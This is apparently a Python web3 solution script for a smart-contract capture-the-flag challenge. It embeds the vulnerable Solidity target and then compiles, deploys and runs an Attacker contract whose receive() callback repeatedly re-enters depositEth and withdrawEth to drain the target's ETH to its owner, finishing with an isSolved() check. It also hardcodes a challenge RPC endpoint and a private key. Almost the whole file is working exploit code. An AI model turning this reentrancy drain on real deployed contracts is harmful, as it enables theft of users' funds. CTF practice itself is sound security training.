from solcx import (
    compile_source,
    
    set_solc_version,
)
from web3 import Web3
from eth_account import Account
import os
import json

# Ensure solc binary path is set correctly
# solc_path = os.path.expanduser('~/.solcx/solc-v0.8.18')
# set_solc_binary(solc_path)
set_solc_version('0.8.18')

# Connect to the private blockchain
w3 = Web3(Web3.HTTPProvider("http://78.47.52.31:14352/8d2f3c1f-1d68-4953-8300-e1c654b485d3"))

# Set up the account
privkey = "0x32f84e47559d0f02d06188cdc8869f72c923a82f75bd7f34a8bdce034a379fa6"
acct = Account.from_key(privkey)

# Get the nonce
nonce = w3.eth.get_transaction_count(acct.address)

# Updated setup_source with ChallengeContract code included
setup_source = '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

// Include the code of ChallengeContract
contract ChallengeContract
{
    address owner;
    uint256 public totalShares;
    mapping(address => uint) public balances;

    constructor()
    {
        totalShares = 0;
        owner = msg.sender;
    }

    receive() external payable { revert(); } // no donations

    function depositEth() public payable {
        uint256 value = msg.value;
        uint256 shares = 0;

        require(value > 0, "Value too small");

        if (totalShares == 0) {
            shares = value;
        }
        else {
            shares = totalShares * value / address(this).balance;
        }
        
        totalShares += shares;
        balances[msg.sender] += shares;
    }

    function withdrawEth(uint256 shares) public {
        require(balances[msg.sender] >= shares, "Not enough shares");

        uint256 value = shares * address(this).balance / totalShares;

        totalShares -= shares;
        balances[msg.sender] -= shares;

        (bool success,) = address(msg.sender).call{value: value}("");
        require(success, "ETH transfer failed");
    }
}

// Placeholder for SharesBuyer contract
contract SharesBuyer {
    constructor(address _target) {}

    receive() external payable {}
    
    function buyShares() public {}
}

contract Setup {
    ChallengeContract public immutable TARGET; // Contract the player will hack
    SharesBuyer public immutable SB;

    constructor() payable {
        require(msg.value == 100 ether, "Not enough initial funds");

        // Deploy the victim contract
        TARGET = new ChallengeContract();
        SB = new SharesBuyer(address(TARGET));

        (bool success,) = address(SB).call{value: 100 ether}("");
        require(success, "Sending ETH to SB failed");
    }

    function isSolved() public view returns (bool) {
        return (address(TARGET).balance == 0 && address(SB).balance == 0);
    }
}
'''

# Compile the updated setup_source
compiled_setup = compile_source(setup_source, output_values=['abi'])
setup_contract_id, setup_interface = compiled_setup.popitem()
setup_abi = setup_interface['abi']

# Replace with the actual setup contract address from your CTF instance
setup_address = w3.to_checksum_address("0xbbf9076c4DdC1471F8aDf9747ec83e50109B008A")

# Create an instance of the Setup contract
setup_contract = w3.eth.contract(address=setup_address, abi=setup_abi)

# Get the address of the ChallengeContract from the Setup contract
challenge_address = setup_contract.functions.TARGET().call()
challenge_address = w3.to_checksum_address(challenge_address)
print(f"ChallengeContract Address: {challenge_address}")

# Compile the attacker contract
attacker_source = '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IChallengeContract {
    function depositEth() external payable;
    function withdrawEth(uint256) external;
    function balances(address) external view returns (uint256);
}

contract Attacker {
    IChallengeContract public target;
    address public owner;
    uint256 public attackCount;

    constructor(address _target) {
        target = IChallengeContract(_target);
        owner = msg.sender;
    }

    // Start the attack
    function attack() external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value > 0, "Need ETH to attack");

        // Initial deposit to get shares
        target.depositEth{value: msg.value}();

        // Start the withdrawal process
        uint256 attackerShares = target.balances(address(this));
        target.withdrawEth(attackerShares);
    }

    // Fallback function to handle reentrancy
    receive() external payable {
        attackCount++;

        if (attackCount < 10) {
            // Re-enter depositEth during withdrawal
            uint256 balance = address(this).balance;
            if (balance > 0) {
                target.depositEth{value: balance}();
            }

            // Withdraw again
            uint256 attackerShares = target.balances(address(this));
            if (attackerShares > 0) {
                target.withdrawEth(attackerShares);
            }
        } else {
            // Transfer the drained ETH to the owner
            payable(owner).transfer(address(this).balance);
        }
    }
}
'''

# Compile the attacker contract
compiled_sol = compile_source(attacker_source, output_values=['abi', 'bin'])
contract_id, contract_interface = compiled_sol.popitem()
attacker_abi = contract_interface['abi']
attacker_bin = contract_interface['bin']

# Build the transaction to deploy the Attacker contract
Attacker = w3.eth.contract(abi=attacker_abi, bytecode=attacker_bin)
construct_txn = Attacker.constructor(challenge_address).build_transaction({
    'from': acct.address,
    'nonce': nonce,
    'gas': 5000000,
    'gasPrice': w3.to_wei('1', 'gwei')
})

# Sign and send the transaction
signed = acct.sign_transaction(construct_txn)
tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
print(f"Deploying Attacker Contract... Transaction Hash: {tx_hash.hex()}")

# Wait for the transaction receipt
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
attacker_contract_address = tx_receipt.contractAddress
print(f"Attacker Contract Deployed at: {attacker_contract_address}")

# Increase the nonce
nonce += 1

# Create an instance of the attacker contract
attacker_contract = w3.eth.contract(address=attacker_contract_address, abi=attacker_abi)

# Build the transaction to call the attack function
attack_txn = attacker_contract.functions.attack().build_transaction({
    'from': acct.address,
    'nonce': nonce,
    'value': w3.to_wei(1, 'ether'),  # You can adjust this amount as needed
    'gas': 5000000,
    'gasPrice': w3.to_wei('1', 'gwei')
})

# Sign and send the transaction
signed_attack_txn = acct.sign_transaction(attack_txn)
attack_tx_hash = w3.eth.send_raw_transaction(signed_attack_txn.rawTransaction)
print(f"Executing Attack... Transaction Hash: {attack_tx_hash.hex()}")

# Wait for the transaction receipt
attack_receipt = w3.eth.wait_for_transaction_receipt(attack_tx_hash)
print("Attack executed successfully.")

# Check if the challenge is solved
is_solved = setup_contract.functions.isSolved().call()
print(f"Challenge Solved: {is_solved}")
